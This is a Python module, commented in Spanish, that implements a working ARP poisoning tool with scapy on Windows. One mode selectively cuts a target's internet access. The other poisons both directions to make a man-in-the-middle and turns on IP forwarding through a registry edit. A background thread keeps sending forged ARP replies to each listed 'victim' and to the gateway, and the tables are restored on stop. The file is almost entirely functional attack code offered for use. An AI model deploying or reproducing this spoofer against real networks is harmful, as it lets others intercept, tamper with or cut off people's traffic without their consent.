"""
core/arp.py
-----------
Implementacion de ARP poisoning sobre scapy (capa 2, requiere Npcap).

Modos:
  - ONE_WAY : solo se envenena a la victima (le decimos que el gateway
              esta en nuestra MAC). Suficiente para CORTAR su salida a
              internet de forma selectiva.
  - TWO_WAY : poisoning bidireccional. Convierte el equipo en MITM
              real; requiere IP forwarding activo para no romper el
              trafico de la victima.

Restauracion: al detener se reenvian N ARP replies correctos para que
la victima y el router recuperen sus tablas originales.
"""
from __future__ import annotations

import ctypes
import platform
import threading
import time
from dataclasses import dataclass

from . import netinfo, proc

IS_WIN = platform.system() == "Windows"

ONE_WAY = "one_way"
TWO_WAY = "two_way"


# ----------------------------------------------------------------------
def has_scapy() -> bool:
    try:
        import scapy.all  # noqa: F401
        return True
    except Exception:
        return False


def has_npcap() -> bool:
    """Detecta si Npcap/WinPcap esta instalado."""
    if not IS_WIN:
        return True
    try:
        ctypes.windll.LoadLibrary("wpcap.dll")
        return True
    except Exception:
        return False


def get_mac(ip: str, iface: str | None = None, retries: int = 3) -> str | None:
    """Resuelve la MAC de una IP con ARP request directo."""
    try:
        from scapy.all import ARP, Ether, srp  # type: ignore
    except Exception:
        return None

    kw = {"timeout": 1.5, "verbose": 0, "retry": retries}
    if iface:
        kw["iface"] = iface
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip), **kw)
        for _, rcv in ans:
            return rcv[Ether].src.upper()
    except Exception:
        return None
    return None


def enable_ip_forwarding(enable: bool = True) -> bool:
    """
    Activa/desactiva IP forwarding en el registro de Windows.
    Necesario para MITM bidireccional. Requiere admin.
    (En Windows moderno suele aplicar sin reinicio con el servicio
     de enrutamiento; si no, reinicia para efecto total.)
    """
    if not IS_WIN:
        return False
    val = "1" if enable else "0"
    cmd = (
        f"Set-ItemProperty -Path "
        f"'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
        f"-Name IPEnableRouter -Value {val} -Type DWord"
    )
    proc.powershell(cmd, timeout=8)
    return True


def get_ip_forwarding() -> bool:
    out = proc.powershell(
        "(Get-ItemProperty -Path "
        "'HKLM:\\SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters' "
        "-Name IPEnableRouter).IPEnableRouter", timeout=6)
    return out.strip() == "1"


# ----------------------------------------------------------------------
@dataclass
class Session:
    target_ip: str
    target_mac: str
    gateway_ip: str
    gateway_mac: str
    mode: str = ONE_WAY
    packets: int = 0
    started_at: float = 0.0
    active: bool = True


class ArpSpoofer:
    """
    Worker en hilo que mantiene el envenenamiento ARP de N victimas.
    Un solo hilo para todas: menos overhead y parada atomica.
    """

    def __init__(self, iface: str | None = None, interval: float = 1.0,
                 log=None):
        self.iface = iface
        self.interval = interval
        self.log = log or (lambda m, l="info": None)
        self._sessions: dict[str, Session] = {}
        self._lock = threading.Lock()
        self._stop = threading.Event()
        self._thread: threading.Thread | None = None
        self._local_mac: str | None = None

    # -------------------------------------------------- propiedades
    @property
    def running(self) -> bool:
        return self._thread is not None and self._thread.is_alive()

    def sessions(self) -> list[Session]:
        with self._lock:
            return list(self._sessions.values())

    def _local_mac_addr(self) -> str:
        if not self._local_mac:
            self._local_mac = netinfo.get_local_mac()
        return self._local_mac

    # -------------------------------------------------- API publica
    def add(self, target_ip: str, gateway_ip: str | None = None,
            mode: str = ONE_WAY) -> bool:
        """
        Anade una victima al envenenamiento. Devuelve True si arranco.
        """
        if not has_scapy():
            self.log("scapy no disponible: ARP spoof deshabilitado", "error")
            return False
        if not has_npcap() and IS_WIN:
            self.log("Npcap no detectado: instala Npcap para ARP spoof", "error")
            return False

        gw = gateway_ip or netinfo.get_gateway()
        if not gw:
            self.log("No se pudo determinar el gateway", "error")
            return False
        if target_ip == gw:
            self.log("La victima no puede ser el propio gateway", "warn")
            return False

        with self._lock:
            if target_ip in self._sessions:
                self.log(f"{target_ip} ya esta envenenado", "warn")
                return True

        self.log(f"Resolviendo MAC de {target_ip} y {gw}...")
        target_mac = get_mac(target_ip, self.iface)
        gateway_mac = get_mac(gw, self.iface)

        if not target_mac:
            self.log(f"Sin respuesta ARP de {target_ip}", "error")
            return False
        if not gateway_mac:
            self.log(f"Sin respuesta ARP del gateway {gw}", "error")
            return False

        with self._lock:
            self._sessions[target_ip] = Session(
                target_ip=target_ip, target_mac=target_mac,
                gateway_ip=gw, gateway_mac=gateway_mac,
                mode=mode, started_at=time.time(),
            )

        self.log(f"Sesion ARP: {target_ip} ({target_mac}) <-> {gw} "
                 f"[{mode}]", "ok")

        if mode == TWO_WAY and IS_WIN:
            enable_ip_forwarding(True)
            self.log("IP forwarding habilitado", "ok")

        self._ensure_thread()
        return True

    def remove(self, target_ip: str, restore: bool = True) -> None:
        with self._lock:
            sess = self._sessions.pop(target_ip, None)
        if not sess:
            return
        if restore:
            self._restore([sess], rounds=4)
            self.log(f"Tablas ARP restauradas para {target_ip}", "ok")
        if not self._sessions:
            self.stop()

    def stop(self, restore: bool = True) -> None:
        self._stop.set()
        t = self._thread
        if t and t.is_alive():
            t.join(timeout=3)
        self._thread = None

        with self._lock:
            pending = list(self._sessions.values())
            self._sessions.clear()

        if restore and pending:
            self._restore(pending, rounds=5)
            self.log(f"Restauracion ARP enviada a {len(pending)} victima(s)", "ok")

    # -------------------------------------------------- interno
    def _ensure_thread(self) -> None:
        if self.running:
            return
        self._stop.clear()
        self._thread = threading.Thread(
            target=self._loop, name="ArpSpoofer", daemon=True
        )
        self._thread.start()

    def _loop(self) -> None:
        try:
            from scapy.all import ARP, Ether, sendp  # type: ignore
        except Exception as exc:
            self.log(f"scapy no cargable: {exc}", "error")
            return

        my_mac = self._local_mac_addr()
        send_kw = {"verbose": 0}
        if self.iface:
            send_kw["iface"] = self.iface

        while not self._stop.is_set():
            with self._lock:
                snapshot = list(self._sessions.values())

            for s in snapshot:
                if not s.active:
                    continue
                try:
                    # 1) Decir a la victima que el gateway es nuestra MAC
                    pkt_victim = (
                        Ether(dst=s.target_mac, src=my_mac)
                        / ARP(op=2, psrc=s.gateway_ip, pdst=s.target_ip,
                              hwsrc=my_mac, hwdst=s.target_mac)
                    )
                    frames = [pkt_victim]

                    # 2) Decir al gateway que la victima es nuestra MAC
                    if s.mode == TWO_WAY:
                        frames.append(
                            Ether(dst=s.gateway_mac, src=my_mac)
                            / ARP(op=2, psrc=s.target_ip, pdst=s.gateway_ip,
                                  hwsrc=my_mac, hwdst=s.gateway_mac)
                        )

                    sendp(frames, **send_kw)
                    s.packets += len(frames)
                except Exception:
                    pass

            time.sleep(self.interval)

    def _restore(self, sessions: list[Session], rounds: int = 5) -> None:
        try:
            from scapy.all import ARP, Ether, sendp  # type: ignore
        except Exception:
            return

        send_kw = {"verbose": 0}
        if self.iface:
            send_kw["iface"] = self.iface

        for _ in range(rounds):
            frames = []
            for s in sessions:
                frames.append(
                    Ether(dst=s.target_mac, src=s.gateway_mac)
                    / ARP(op=2, psrc=s.gateway_ip, pdst=s.target_ip,
                          hwsrc=s.gateway_mac, hwdst=s.target_mac)
                )
                frames.append(
                    Ether(dst=s.gateway_mac, src=s.target_mac)
                    / ARP(op=2, psrc=s.target_ip, pdst=s.gateway_ip,
                          hwsrc=s.target_mac, hwdst=s.gateway_mac)
                )
            try:
                sendp(frames, **send_kw)
            except Exception:
                pass
            time.sleep(0.25)